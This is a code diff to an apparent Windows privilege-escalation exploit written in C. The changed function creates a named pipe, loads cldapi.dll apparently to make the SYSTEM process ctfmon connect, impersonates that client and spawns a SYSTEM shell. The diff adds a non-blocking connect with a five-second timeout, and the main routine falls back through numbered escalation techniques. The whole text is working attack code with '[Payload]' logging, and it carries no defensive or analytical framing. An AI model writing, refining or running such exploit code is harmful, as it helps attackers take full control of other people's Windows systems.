@@ -130,8 +130,8 @@ BOOL SpawnSystemShell_NamedPipe() {
     WCHAR pipeName[] = L"\\\\.\\pipe\\GreenPlasmaSystemPipe";
     hPipe = CreateNamedPipeW(
         pipeName,
-        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
-        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE | FILE_FLAG_OVERLAPPED,
+        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_NOWAIT,
         1, 4096, 4096, 0, NULL);
 
     if (hPipe == INVALID_HANDLE_VALUE) {
@@ -139,9 +139,15 @@ BOOL SpawnSystemShell_NamedPipe() {
         return FALSE;
     }
 
-    // Wait for a connection (with timeout)
-    OutputDebugStringA("[Payload] Waiting for SYSTEM process to connect to pipe...\n");
-    
+    // Use overlapped I/O for non-blocking connect with 5-second timeout
+    OVERLAPPED overlapped = { 0 };
+    overlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+    if (!overlapped.hEvent) {
+        OutputDebugStringA("[Payload] Failed to create event\n");
+        CloseHandle(hPipe);
+        return FALSE;
+    }
+
     // Trigger ctfmon to potentially connect
     HMODULE hCldapi = LoadLibraryA("cldapi.dll");
     if (hCldapi) {
@@ -152,14 +158,39 @@ BOOL SpawnSystemShell_NamedPipe() {
         }
     }
 
-    // Connect with timeout
-    if (!ConnectNamedPipe(hPipe, NULL)) {
-        if (GetLastError() != ERROR_PIPE_CONNECTED) {
-            OutputDebugStringA("[Payload] Pipe connection failed\n");
+    OutputDebugStringA("[Payload] Waiting 5s for SYSTEM process to connect to pipe...\n");
+
+    // Connect with 5-second timeout (non-blocking)
+    BOOL connected = ConnectNamedPipe(hPipe, &overlapped);
+    DWORD lastErr = GetLastError();
+
+    if (!connected && lastErr == ERROR_IO_PENDING) {
+        // Wait up to 5 seconds for connection
+        DWORD waitResult = WaitForSingleObject(overlapped.hEvent, 5000);
+        if (waitResult == WAIT_TIMEOUT) {
+            OutputDebugStringA("[Payload] Pipe connection timed out (5s) - skipping Technique 2\n");
+            CancelIo(hPipe);
+            CloseHandle(overlapped.hEvent);
             CloseHandle(hPipe);
             return FALSE;
         }
+        if (waitResult != WAIT_OBJECT_0) {
+            OutputDebugStringA("[Payload] Pipe connection failed\n");
+            CloseHandle(overlapped.hEvent);
+            CloseHandle(hPipe);
+            return FALSE;
+        }
+    } else if (!connected && lastErr == ERROR_PIPE_CONNECTED) {
+        // Client connected before we called ConnectNamedPipe - this is fine
+        OutputDebugStringA("[Payload] Pipe already connected\n");
+    } else if (!connected) {
+        OutputDebugStringA("[Payload] Pipe connection failed\n");
+        CloseHandle(overlapped.hEvent);
+        CloseHandle(hPipe);
+        return FALSE;
     }
+
+    CloseHandle(overlapped.hEvent);
 
     // Impersonate the client (should be SYSTEM)
     if (ImpersonateNamedPipeClient(hPipe)) {
@@ -302,7 +333,7 @@ int wmain(int argc, wchar_t** argv) {
     }
     printf("[-] Technique 1 failed.\n\n");
 
-    printf("[*] Attempting Technique 2: Named Pipe Impersonation...\n");
+    printf("[*] Attempting Technique 2: Named Pipe Impersonation (5s timeout)...\n");
     if (SpawnSystemShell_NamedPipe()) {
         printf("[+] SYSTEM shell spawned via Technique 2!\n");
         return 0;
